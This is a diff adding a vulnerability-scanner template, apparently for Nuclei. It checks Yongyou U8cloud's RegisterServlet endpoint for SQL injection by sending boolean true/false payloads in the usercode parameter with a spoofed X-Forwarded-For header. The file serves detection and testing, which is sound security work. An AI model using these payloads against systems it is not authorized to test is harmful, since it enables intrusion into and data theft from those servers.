@@ -1,0 +1,47 @@
+id: poc-yaml-yongyou-u8cloud-registerservlet-sqli
+info:
+  name: Yongyou U8cloud RegisterServlet SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    The Yongyou U8cloud RegisterServlet endpoint is vulnerable to SQL injection. This template attempts to exploit the vulnerability by injecting payloads via the `usercode` parameter.
+
+variables:
+  t1: "{{base64(rand_text_alphanumeric(4))}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: test-false-condition
+    method: GET
+    path:
+      - "/service/RegisterServlet?usercode='or(1=0)--+&key={{t1}}"
+    headers:
+      X-Forwarded-For: 127.0.0.1
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "Error:null"
+
+  - id: test-true-condition
+    method: GET
+    path:
+      - "/service/RegisterServlet?usercode='or(1=1)--+&key={{t1}}"
+    headers:
+      X-Forwarded-For: 127.0.0.1
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t1}}"
